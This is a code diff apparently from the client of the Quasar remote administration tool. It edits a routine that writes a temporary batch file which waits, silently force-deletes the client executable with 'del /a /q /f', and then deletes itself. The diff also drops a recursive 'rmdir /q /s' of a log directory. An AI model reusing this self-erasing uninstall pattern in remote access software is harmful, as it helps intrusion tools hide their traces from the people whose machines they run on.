@@ -13,9 +13,8 @@ namespace Quasar.Client.IO
         /// Creates the uninstall batch file.
         /// </summary>
         /// <param name="currentFilePath">The current file path of the client.</param>
-        /// <param name="logDirectory">The log directory.</param>
         /// <returns>The file path to the batch file which can then get executed. Returns <c>string.Empty</c> on failure.</returns>
-        public static string CreateUninstallBatch(string currentFilePath, string logDirectory)
+        public static string CreateUninstallBatch(string currentFilePath)
         {
             string batchFile = FileHelper.GetTempFilePath(".bat");
 
@@ -25,7 +24,6 @@ namespace Quasar.Client.IO
                 "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                 "ping -n 10 localhost > nul" + "\r\n" +
                 "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
-                "rmdir /q /s " + "\"" + logDirectory + "\"" + "\r\n" +
                 "del /a /q /f " + "\"" + batchFile + "\"";
 
             File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
